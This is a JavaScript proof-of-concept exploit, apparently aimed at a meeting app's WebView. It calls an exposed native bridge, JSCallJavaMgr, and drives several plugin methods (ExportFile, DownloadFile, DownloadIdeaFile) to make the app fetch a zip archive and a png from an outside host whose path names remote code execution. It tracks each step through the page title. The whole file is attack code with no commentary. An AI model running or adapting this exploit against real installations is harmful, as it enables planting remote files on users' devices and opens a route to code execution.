(function(){
  document.title='P84MAIN:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P84MCB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P84MAIN-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P84MAIN-NOMGR:'+location.host;return}
  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
  var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
  var q=[
    ['MH2','CommonPlugin','GetPerformance',{}],
    ['ME1','CommonPlugin','ExportFile',{url:zip,fileName:'p84.zip',contentType:'application/zip'}],
    ['MV0','VirtualBackgroundWebPlugin','GetWebAppVirtualBackgroundConfig',{}],
    ['MV1','VirtualBackgroundWebPlugin','DownloadFile',{url:png,over_write:true}],
    ['MI2','IdeaWebViewPlugin','DownloadIdeaFile',{url:zip,idea_id:'1',content_type:'application/zip',idea_title:'p84',meeting_code:'123456789'}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P84MAIN-DONE:'+location.host;return}
    var x=q[i++];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 3500);
  }
  setTimeout(n, 800);
})();
